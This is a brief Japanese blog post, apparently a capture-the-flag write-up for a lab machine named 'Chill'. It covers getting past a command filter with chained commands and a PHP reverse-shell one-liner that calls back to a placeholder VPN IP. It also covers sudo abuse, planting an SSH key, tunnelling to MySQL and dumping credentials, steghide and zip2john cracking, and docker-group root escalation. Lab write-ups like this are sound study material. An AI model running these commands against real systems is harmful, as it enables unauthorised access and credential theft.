---
title: "Chill"
date: 2024-03-16T11:49:38+09:00
draft: false
---

### user.txt

- gobuster で見つかった /secret にアクセスすると linux コマンドを実行できるサイトが見つかる
  - ```ls``` を実行すると ```are you hacker?``` っていうアラートが出る
  - ```pwd;ls``` だとアラートが出ず，実行結果が見える
  - ここにリバースシェルを入れればいい
- ```whoami;php -r '$sock=fsockopen("your-vpn-ip",4444);exec("/bin/sh -i <&3 >&3 2>&3");'```
  - www-data では何もできない
  - ```sudo -l``` で，.helpline.sh が apaar として実行できるっぽい
  - .helpline.sh を見ると，```$msg 2>/dev/null``` が見える
  - ```/bin/bash``` を実行すれば apaar としてシェルをもらえる

### root.txt

- linpeas.sh
  - 127.0.0.1:9001 が localhost から実行できるらしい
  - で，ここに mysql が動いてる
  - local で ssh-keygen
    - ```echo "contents of .pub" >> /home/apaar/.ssh/authorized_keys```
    - ```ssh -L 9001:127.0.0.1:9001 apaar@10.10.233.203 -i id_rsa```
  - index.php を見ると root とパスワードが載ってる
    - apaar から mysql にログイン
    - ```mysql -h localhost -u root -p```
    - ```show databese```
    - ```show tables```
    - ```SELECT * FROM users``` -> anurodh のパスワード
    - customer portal みたいなとこからログインして，images をダウンロードする
    - ```steghide —extract -sf .jpg```
    - ```zip2john```
    - あとは php の中を見て anurodh の base64 エンコードされたパスワードを見る
- anurodh
  - docker ユーザなので GTFObin でOK
- 結構難しかったな
